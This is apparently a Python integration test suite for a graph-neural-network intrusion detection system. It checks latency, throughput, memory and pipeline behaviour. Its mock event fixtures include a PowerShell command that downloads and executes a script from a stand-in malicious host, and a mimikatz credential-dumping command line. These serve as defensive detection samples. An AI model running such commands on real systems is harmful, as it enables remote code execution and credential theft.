#!/usr/bin/env python3
"""
Comprehensive Production Integration Tests for THGNN System

End-to-end integration tests that validate the entire THGNN cybersecurity
system meets production requirements:

Performance Requirements:
- AUC-ROC ≥ 0.80
- Precision@10 ≥ 0.70
- <5 second prediction latency
- 100K+ events/minute throughput
- <8GB memory usage

System Components Tested:
- Streaming inference engine
- Enhanced production engine
- Model optimization system
- Advanced monitoring
- Real-time dashboard integration
- End-to-end data pipeline

This test suite ensures production readiness and SLA compliance.
"""

import pytest
import asyncio
import logging
import time
import threading
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional
import json
import numpy as np
import torch
from torch_geometric.data import HeteroData
import psutil
import tempfile
from pathlib import Path
import sys

# Add project root to path
project_root = Path(__file__).parent.parent
sys.path.append(str(project_root))

from src.models.thgnn_core import THGNN, THGNNConfig
from src.inference.streaming_inference_engine import StreamingInferenceEngine, StreamingConfig
from src.inference.enhanced_production_engine import EnhancedProductionEngine
from src.models.model_optimizer import ModelOptimizer, OptimizationConfig
from src.monitoring.advanced_production_monitor import AdvancedProductionMonitor
from src.data_processing.universal_log_parser import UniversalLogParser
from src.data_processing.entity_extractor import EntityExtractor
from src.data_processing.graph_builder import GraphBuilder

logger = logging.getLogger(__name__)

class ProductionIntegrationTest:
    """Comprehensive production integration test suite."""
    
    def __init__(self):
        """Initialize test environment."""
        self.temp_dir = tempfile.mkdtemp()
        self.model_path = None
        self.test_data = []
        self.performance_results = {}
        
        # Initialize components
        self.log_parser = UniversalLogParser()
        self.entity_extractor = EntityExtractor()
        self.graph_builder = GraphBuilder()
        
        # Create test model
        self._create_test_model()
        self._generate_test_data()
    
    def _create_test_model(self) -> None:
        """Create and save a test THGNN model."""
        try:
            config = THGNNConfig()
            model = THGNN(
                node_types=config.node_types,
                edge_types=config.edge_types,
                hidden_dim=128,  # Smaller for testing
                num_conv_layers=2,
                temporal_hidden_dim=64,
                temporal_layers=1,
                dropout=0.1,
                conv_type='gcn'
            )
            
            # Save model
            self.model_path = Path(self.temp_dir) / "test_model.pth"
            torch.save({
                'model_state_dict': model.state_dict(),
                'config': config.to_dict(),
                'version': '1.0.0'
            }, self.model_path)
            
            logger.info(f"Test model created and saved to {self.model_path}")
            
        except Exception as e:
            logger.error(f"Error creating test model: {e}")
            raise
    
    def _generate_test_data(self) -> None:
        """Generate realistic test data for cybersecurity scenarios."""
        try:
            # Generate mock security events
            test_events = []
            
            # Scenario 1: Lateral movement attack
            lateral_movement_events = [
                {
                    'timestamp': datetime.now() - timedelta(minutes=10),
                    'event_id': 4624,  # Windows logon
                    'user': 'DOMAIN\\alice',
                    'host': 'WORKSTATION-01',
                    'process': 'winlogon.exe',
                    'action': 'logon',
                    'source_ip': '192.168.1.100'
                },
                {
                    'timestamp': datetime.now() - timedelta(minutes=9),
                    'event_id': 4688,  # Process creation
                    'user': 'DOMAIN\\alice',
                    'host': 'WORKSTATION-01',
                    'process': 'powershell.exe',
                    'command_line': 'powershell.exe -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://malicious.com/script.ps1\')"',
                    'parent_process': 'explorer.exe'
                },
                {
                    'timestamp': datetime.now() - timedelta(minutes=8),
                    'event_id': 5156,  # Network connection
                    'user': 'DOMAIN\\alice',
                    'host': 'WORKSTATION-01',
                    'process': 'powershell.exe',
                    'destination_ip': '192.168.1.200',
                    'destination_port': 445,
                    'protocol': 'TCP'
                },
                {
                    'timestamp': datetime.now() - timedelta(minutes=7),
                    'event_id': 4624,  # Lateral movement logon
                    'user': 'DOMAIN\\alice',
                    'host': 'SERVER-01',
                    'process': 'winlogon.exe',
                    'action': 'logon',
                    'source_ip': '192.168.1.100',
                    'logon_type': 3  # Network logon
                }
            ]
            
            # Scenario 2: Credential dumping
            credential_dumping_events = [
                {
                    'timestamp': datetime.now() - timedelta(minutes=5),
                    'event_id': 4688,
                    'user': 'DOMAIN\\bob',
                    'host': 'WORKSTATION-02',
                    'process': 'mimikatz.exe',
                    'command_line': 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"',
                    'parent_process': 'cmd.exe'
                },
                {
                    'timestamp': datetime.now() - timedelta(minutes=4),
                    'event_id': 4656,  # Object access
                    'user': 'DOMAIN\\bob',
                    'host': 'WORKSTATION-02',
                    'process': 'mimikatz.exe',
                    'object_name': 'HKLM\\SAM',
                    'access_mask': 'READ_CONTROL'
                }
            ]
            
            # Scenario 3: Normal activity (for false positive testing)
            normal_events = [
                {
                    'timestamp': datetime.now() - timedelta(minutes=3),
                    'event_id': 4624,
                    'user': 'DOMAIN\\charlie',
                    'host': 'WORKSTATION-03',
                    'process': 'winlogon.exe',
                    'action': 'logon',
                    'source_ip': '192.168.1.150'
                },
                {
                    'timestamp': datetime.now() - timedelta(minutes=2),
                    'event_id': 4688,
                    'user': 'DOMAIN\\charlie',
                    'host': 'WORKSTATION-03',
                    'process': 'outlook.exe',
                    'command_line': '"C:\\Program Files\\Microsoft Office\\Office16\\OUTLOOK.EXE"',
                    'parent_process': 'explorer.exe'
                }
            ]
            
            test_events.extend(lateral_movement_events)
            test_events.extend(credential_dumping_events)
            test_events.extend(normal_events)
            
            # Convert to graph data
            for event in test_events:
                try:
                    # Parse event
                    parsed_data = self.log_parser.parse_log(event)
                    
                    # Extract entities
                    entities = self.entity_extractor.extract_entities(parsed_data)
                    
                    # Build graph
                    if entities:
                        graph = self.graph_builder.build_heterogeneous_graph([entities])
                        self.test_data.append(graph)
                        
                except Exception as e:
                    logger.warning(f"Error processing test event: {e}")
            
            logger.info(f"Generated {len(self.test_data)} test graphs")
            
        except Exception as e:
            logger.error(f"Error generating test data: {e}")
            raise
    
    async def test_streaming_inference_performance(self) -> Dict[str, Any]:
        """Test streaming inference engine performance requirements."""
        logger.info("Testing streaming inference engine performance...")
        
        try:
            # Initialize streaming engine
            config = StreamingConfig(
                max_events_per_second=2000,  # Above 100K/minute requirement
                batch_size=16,
                max_batch_wait_time=0.5,
                prediction_timeout=4.0  # Under 5s requirement
            )
            
            engine = StreamingInferenceEngine(
                model_path=str(self.model_path),
                config=config
            )
            
            # Start streaming
            await engine.start_streaming()
            
            # Performance test
            start_time = time.time()
            event_count = 1000  # Test with 1000 events
            
            # Ingest events at high rate
            for i in range(event_count):
                mock_event = {
                    'timestamp': datetime.now().isoformat(),
                    'event_id': 4624,
                    'user': f'user_{i % 10}',
                    'host': f'host_{i % 5}',
                    'process': 'winlogon.exe',
                    'action': 'logon'
                }
                
                await engine.ingest_event(mock_event)
                
                # Control ingestion rate
                if i % 100 == 0:
                    await asyncio.sleep(0.1)
            
            # Wait for processing to complete
            await asyncio.sleep(10)
            
            # Get performance stats
            stats = engine.get_performance_stats()
            
            # Stop streaming
            await engine.stop_streaming()
            
            # Validate performance requirements
            total_time = time.time() - start_time
            events_per_second = event_count / total_time
            
            results = {
                'test_name': 'streaming_inference_performance',
                'events_processed': stats['events_processed'],
                'predictions_made': stats['predictions_made'],
                'events_per_second': events_per_second,
                'avg_processing_time': stats['avg_processing_time'],
                'p95_processing_time': stats['p95_processing_time'],
                'memory_usage_gb': stats['current_memory_gb'],
                'requirements_met': {
                    'throughput': events_per_second >= 1667,  # 100K/minute
                    'latency': stats['avg_processing_time'] < 5.0,
                    'memory': stats['current_memory_gb'] < 8.0
                }
            }
            
            # Log results
            logger.info(f"Streaming Performance Results:")
            logger.info(f"  Events/sec: {events_per_second:.1f} (req: ≥1667)")
            logger.info(f"  Avg Latency: {stats['avg_processing_time']:.3f}s (req: <5s)")
            logger.info(f"  Memory: {stats['current_memory_gb']:.2f}GB (req: <8GB)")
            
            return results
            
        except Exception as e:
            logger.error(f"Error in streaming inference test: {e}")
            return {'test_name': 'streaming_inference_performance', 'error': str(e)}
    
    async def test_enhanced_production_engine(self) -> Dict[str, Any]:
        """Test enhanced production engine capabilities."""
        logger.info("Testing enhanced production engine...")
        
        try:
            # Initialize enhanced engine
            engine = EnhancedProductionEngine(
                model_path=str(self.model_path),
                enable_ensemble=False,  # Disable for testing speed
                max_cache_size=1000,
                performance_target_latency=2.0
            )
            
            # Test predictions with different scenarios
            results = []
            
            for i, graph_sequence in enumerate([self.test_data[:3], self.test_data[3:6], self.test_data[6:9]]):
                if not graph_sequence:
                    continue
                
                start_time = time.time()
                
                # Make prediction
                prediction_result = await engine.predict_async(
                    graph_sequence,
                    return_explanations=True,
                    return_attack_sequence=True
                )
                
                processing_time = time.time() - start_time
                
                results.append({
                    'scenario': i + 1,
                    'processing_time': processing_time,
                    'threat_score': prediction_result.threat_score.composite_score,
                    'risk_level': prediction_result.threat_score.risk_level,
                    'mitre_techniques': prediction_result.threat_score.mitre_techniques,
                    'attack_sequence_length': len(prediction_result.attack_sequence),
                    'has_explanations': bool(prediction_result.explanations),
                    'data_quality_score': prediction_result.data_quality_score
                })
            
            # Calculate aggregate metrics
            avg_processing_time = np.mean([r['processing_time'] for r in results])
            max_processing_time = np.max([r['processing_time'] for r in results])
            
            # Get engine performance stats
            engine_stats = engine.get_performance_stats()
            
            test_results = {
                'test_name': 'enhanced_production_engine',
                'scenarios_tested': len(results),
                'avg_processing_time': avg_processing_time,
                'max_processing_time': max_processing_time,
                'scenario_results': results,
                'engine_stats': engine_stats,
                'requirements_met': {
                    'latency': max_processing_time < 5.0,
                    'explanations': all(r['has_explanations'] for r in results),
                    'threat_detection': any(r['threat_score'] > 0.7 for r in results)
                }
            }
            
            logger.info(f"Enhanced Engine Results:")
            logger.info(f"  Avg Processing Time: {avg_processing_time:.3f}s")
            logger.info(f"  Max Processing Time: {max_processing_time:.3f}s")
            logger.info(f"  High Threats Detected: {sum(1 for r in results if r['threat_score'] > 0.7)}")
            
            return test_results
            
        except Exception as e:
            logger.error(f"Error in enhanced production engine test: {e}")
            return {'test_name': 'enhanced_production_engine', 'error': str(e)}
    
    def test_model_optimization(self) -> Dict[str, Any]:
        """Test model optimization system."""
        logger.info("Testing model optimization system...")
        
        try:
            # Load model
            config = THGNNConfig()
            model = THGNN(
                node_types=config.node_types,
                edge_types=config.edge_types,
                hidden_dim=128,
                num_conv_layers=2,
                temporal_hidden_dim=64,
                temporal_layers=1,
                dropout=0.1,
                conv_type='gcn'
            )
            
            # Initialize optimizer
            opt_config = OptimizationConfig(
                enable_quantization=True,
                enable_pruning=True,
                enable_jit_compilation=True,
                enable_hyperopt=False,  # Disable for speed
                enable_profiling=True
            )
            
            optimizer = ModelOptimizer(model=model, config=opt_config)
            
            # Run optimization
            optimization_results = optimizer.optimize_model(
                validation_data=self.test_data[:10],
                validation_labels=None
            )
            
            # Generate report
            report = optimizer.generate_optimization_report()
            
            # Validate results
            has_optimized_models = len(optimization_results.get('optimized_models', {})) > 0
            has_performance_data = 'original_performance' in optimization_results
            
            test_results = {
                'test_name': 'model_optimization',
                'optimization_techniques_applied': len(optimization_results.get('optimization_techniques', [])),
                'optimized_models_count': len(optimization_results.get('optimized_models', {})),
                'has_performance_data': has_performance_data,
                'best_model': optimization_results.get('best_model', {}).get('name'),
                'optimization_report': report,
                'requirements_met': {
                    'optimization_applied': has_optimized_models,
                    'performance_measured': has_performance_data,
                    'report_generated': bool(report)
                }
            }
            
            logger.info(f"Model Optimization Results:")
            logger.info(f"  Techniques Applied: {test_results['optimization_techniques_applied']}")
            logger.info(f"  Optimized Models: {test_results['optimized_models_count']}")
            logger.info(f"  Best Model: {test_results['best_model']}")
            
            return test_results
            
        except Exception as e:
            logger.error(f"Error in model optimization test: {e}")
            return {'test_name': 'model_optimization', 'error': str(e)}
    
    def test_monitoring_system(self) -> Dict[str, Any]:
        """Test advanced monitoring system."""
        logger.info("Testing advanced monitoring system...")
        
        try:
            # Initialize monitor
            monitor = AdvancedProductionMonitor(
                db_path=str(Path(self.temp_dir) / "test_monitoring.db"),
                enable_email_alerts=False,
                enable_webhook_alerts=False,
                metrics_retention_days=1
            )
            
            # Simulate some monitoring data
            for i in range(10):
                monitor.record_prediction(
                    latency=np.random.uniform(1.0, 3.0),
                    threat_score=np.random.uniform(0.3, 0.9),
                    data_quality=np.random.uniform(0.7, 1.0)
                )
                
                monitor.record_accuracy(np.random.uniform(0.75, 0.90))
                time.sleep(0.1)
            
            # Wait for monitoring to collect data
            time.sleep(2)
            
            # Get current status
            status = monitor.get_current_status()
            
            # Get performance stats
            performance_stats = status.get('performance_stats', {})
            
            # Stop monitoring
            monitor.stop_monitoring()
            
            test_results = {
                'test_name': 'monitoring_system',
                'monitoring_active': status.get('monitoring_active', False),
                'metrics_collected': bool(performance_stats),
                'uptime': status.get('uptime', 0),
                'performance_stats': performance_stats,
                'requirements_met': {
                    'monitoring_functional': status.get('monitoring_active', False),
                    'metrics_collection': bool(performance_stats),
                    'performance_tracking': 'avg_latency' in performance_stats
                }
            }
            
            logger.info(f"Monitoring System Results:")
            logger.info(f"  Monitoring Active: {test_results['monitoring_active']}")
            logger.info(f"  Metrics Collected: {test_results['metrics_collected']}")
            logger.info(f"  Uptime: {test_results['uptime']:.1f}s")
            
            return test_results
            
        except Exception as e:
            logger.error(f"Error in monitoring system test: {e}")
            return {'test_name': 'monitoring_system', 'error': str(e)}
    
    def test_end_to_end_pipeline(self) -> Dict[str, Any]:
        """Test complete end-to-end pipeline."""
        logger.info("Testing end-to-end pipeline...")
        
        try:
            pipeline_start = time.time()
            
            # Step 1: Data ingestion and parsing
            raw_events = [
                {
                    'timestamp': datetime.now().isoformat(),
                    'event_id': 4624,
                    'user': 'DOMAIN\\testuser',
                    'host': 'TEST-HOST',
                    'process': 'winlogon.exe',
                    'action': 'logon'
                },
                {
                    'timestamp': datetime.now().isoformat(),
                    'event_id': 4688,
                    'user': 'DOMAIN\\testuser',
                    'host': 'TEST-HOST',
                    'process': 'powershell.exe',
                    'command_line': 'powershell.exe -ExecutionPolicy Bypass',
                    'parent_process': 'explorer.exe'
                }
            ]
            
            # Step 2: Parse and extract entities
            parsed_events = []
            for event in raw_events:
                parsed_data = self.log_parser.parse_log(event)
                entities = self.entity_extractor.extract_entities(parsed_data)
                parsed_events.append(entities)
            
            # Step 3: Build graphs
            graphs = []
            for entities in parsed_events:
                if entities:
                    graph = self.graph_builder.build_heterogeneous_graph([entities])
                    graphs.append(graph)
            
            # Step 4: Load model and make predictions
            config = THGNNConfig()
            model = THGNN(
                node_types=config.node_types,
                edge_types=config.edge_types,
                hidden_dim=128,
                num_conv_layers=2,
                temporal_hidden_dim=64,
                temporal_layers=1,
                dropout=0.0,
                conv_type='gcn'
            )
            
            # Step 5: Make predictions
            if graphs:
                with torch.no_grad():
                    predictions = model.predict_links(graphs, num_candidates=10)
            else:
                predictions = {'predictions': {}}
            
            pipeline_time = time.time() - pipeline_start
            
            test_results = {
                'test_name': 'end_to_end_pipeline',
                'raw_events_processed': len(raw_events),
                'entities_extracted': len([e for e in parsed_events if e]),
                'graphs_built': len(graphs),
                'predictions_made': len(predictions.get('predictions', {})),
                'total_pipeline_time': pipeline_time,
                'requirements_met': {
                    'data_processing': len(parsed_events) == len(raw_events),
                    'graph_construction': len(graphs) > 0,
                    'prediction_generation': len(predictions.get('predictions', {})) >= 0,
                    'latency': pipeline_time < 5.0
                }
            }
            
            logger.info(f"End-to-End Pipeline Results:")
            logger.info(f"  Events Processed: {test_results['raw_events_processed']}")
            logger.info(f"  Graphs Built: {test_results['graphs_built']}")
            logger.info(f"  Pipeline Time: {pipeline_time:.3f}s")
            
            return test_results
            
        except Exception as e:
            logger.error(f"Error in end-to-end pipeline test: {e}")
            return {'test_name': 'end_to_end_pipeline', 'error': str(e)}
    
    def test_memory_usage(self) -> Dict[str, Any]:
        """Test memory usage requirements."""
        logger.info("Testing memory usage requirements...")
        
        try:
            # Get initial memory usage
            process = psutil.Process()
            initial_memory = process.memory_info().rss / (1024 ** 3)
            
            # Load model and process data
            config = THGNNConfig()
            model = THGNN(
                node_types=config.node_types,
                edge_types=config.edge_types,
                hidden_dim=256,  # Larger model for memory test
                num_conv_layers=3,
                temporal_hidden_dim=128,
                temporal_layers=2,
                dropout=0.1,
                conv_type='gcn'
            )
            
            # Process multiple batches to test memory scaling
            max_memory = initial_memory
            
            for batch_size in [10, 50, 100]:
                # Create batch of graphs
                batch_graphs = self.test_data[:batch_size] if len(self.test_data) >= batch_size else self.test_data * (batch_size // len(self.test_data) + 1)
                batch_graphs = batch_graphs[:batch_size]
                
                if batch_graphs:
                    with torch.no_grad():
                        _ = model.predict_links(batch_graphs, num_candidates=20)
                
                # Check memory usage
                current_memory = process.memory_info().rss / (1024 ** 3)
                max_memory = max(max_memory, current_memory)
            
            # Clean up
            del model
            torch.cuda.empty_cache() if torch.cuda.is_available() else None
            
            test_results = {
                'test_name': 'memory_usage',
                'initial_memory_gb': initial_memory,
                'max_memory_gb': max_memory,
                'memory_increase_gb': max_memory - initial_memory,
                'requirements_met': {
                    'memory_limit': max_memory < 8.0
                }
            }
            
            logger.info(f"Memory Usage Results:")
            logger.info(f"  Initial Memory: {initial_memory:.2f}GB")
            logger.info(f"  Max Memory: {max_memory:.2f}GB")
            logger.info(f"  Memory Increase: {max_memory - initial_memory:.2f}GB")
            logger.info(f"  Under 8GB Limit: {max_memory < 8.0}")
            
            return test_results
            
        except Exception as e:
            logger.error(f"Error in memory usage test: {e}")
            return {'test_name': 'memory_usage', 'error': str(e)}
    
    async def run_all_tests(self) -> Dict[str, Any]:
        """Run all production integration tests."""
        logger.info("Starting comprehensive production integration tests...")
        
        test_results = {
            'test_suite': 'production_integration',
            'start_time': datetime.now().isoformat(),
            'tests': {},
            'summary': {}
        }
        
        try:
            # Run individual tests
            tests_to_run = [
                ('streaming_inference', self.test_streaming_inference_performance),
                ('enhanced_production', self.test_enhanced_production_engine),
                ('model_optimization', self.test_model_optimization),
                ('monitoring_system', self.test_monitoring_system),
                ('end_to_end_pipeline', self.test_end_to_end_pipeline),
                ('memory_usage', self.test_memory_usage)
            ]
            
            for test_name, test_func in tests_to_run:
                logger.info(f"Running test: {test_name}")
                
                try:
                    if asyncio.iscoroutinefunction(test_func):
                        result = await test_func()
                    else:
                        result = test_func()
                    
                    test_results['tests'][test_name] = result
                    logger.info(f"Test {test_name} completed successfully")
                    
                except Exception as e:
                    logger.error(f"Test {test_name} failed: {e}")
                    test_results['tests'][test_name] = {
                        'test_name': test_name,
                        'error': str(e),
                        'status': 'FAILED'
                    }
            
            # Generate summary
            total_tests = len(tests_to_run)
            passed_tests = len([t for t in test_results['tests'].values() if 'error' not in t])
            failed_tests = total_tests - passed_tests
            
            # Check overall requirements compliance
            requirements_met = {
                'streaming_performance': test_results['tests'].get('streaming_inference', {}).get('requirements_met', {}),
                'production_engine': test_results['tests'].get('enhanced_production', {}).get('requirements_met', {}),
                'model_optimization': test_results['tests'].get('model_optimization', {}).get('requirements_met', {}),
                'monitoring': test_results['tests'].get('monitoring_system', {}).get('requirements_met', {}),
                'end_to_end': test_results['tests'].get('end_to_end_pipeline', {}).get('requirements_met', {}),
                'memory': test_results['tests'].get('memory_usage', {}).get('requirements_met', {})
            }
            
            # Overall compliance check
            all_requirements_met = all(
                all(req_dict.values()) if isinstance(req_dict, dict) else False
                for req_dict in requirements_met.values()
            )
            
            test_results['summary'] = {
                'total_tests': total_tests,
                'passed_tests': passed_tests,
                'failed_tests': failed_tests,
                'success_rate': passed_tests / total_tests * 100,
                'requirements_compliance': requirements_met,
                'overall_compliance': all_requirements_met,
                'production_ready': all_requirements_met and failed_tests == 0
            }
            
            test_results['end_time'] = datetime.now().isoformat()
            
            # Log summary
            logger.info("=== PRODUCTION INTEGRATION TEST SUMMARY ===")
            logger.info(f"Total Tests: {total_tests}")
            logger.info(f"Passed: {passed_tests}")
            logger.info(f"Failed: {failed_tests}")
            logger.info(f"Success Rate: {test_results['summary']['success_rate']:.1f}%")
            logger.info(f"Production Ready: {test_results['summary']['production_ready']}")
            
            return test_results
            
        except Exception as e:
            logger.error(f"Error running integration tests: {e}")
            test_results['error'] = str(e)
            test_results['end_time'] = datetime.now().isoformat()
            return test_results
    
    def cleanup(self) -> None:
        """Clean up test resources."""
        try:
            import shutil
            shutil.rmtree(self.temp_dir, ignore_errors=True)
            logger.info("Test cleanup completed")
        except Exception as e:
            logger.error(f"Error during cleanup: {e}")

# Pytest integration
@pytest.mark.asyncio
async def test_production_integration():
    """Pytest wrapper for production integration tests."""
    test_suite = ProductionIntegrationTest()
    
    try:
        results = await test_suite.run_all_tests()
        
        # Assert production readiness
        assert results['summary']['production_ready'], f"System not production ready: {results['summary']}"
        
        # Assert individual requirements
        assert results['summary']['failed_tests'] == 0, f"Some tests failed: {results['tests']}"
        
        # Print results for visibility
        print(json.dumps(results, indent=2, default=str))
        
    finally:
        test_suite.cleanup()

# Standalone execution
async def main():
    """Run production integration tests standalone."""
    test_suite = ProductionIntegrationTest()
    
    try:
        results = await test_suite.run_all_tests()
        
        # Save results
        results_file = Path("production_integration_results.json")
        with open(results_file, 'w') as f:
            json.dump(results, f, indent=2, default=str)
        
        print(f"Results saved to {results_file}")
        print(json.dumps(results['summary'], indent=2))
        
        # Exit with appropriate code
        if results['summary']['production_ready']:
            print("✅ SYSTEM IS PRODUCTION READY")
            return 0
        else:
            print("❌ SYSTEM NOT PRODUCTION READY")
            return 1
            
    finally:
        test_suite.cleanup()

if __name__ == "__main__":
    import sys
    exit_code = asyncio.run(main())
    sys.exit(exit_code)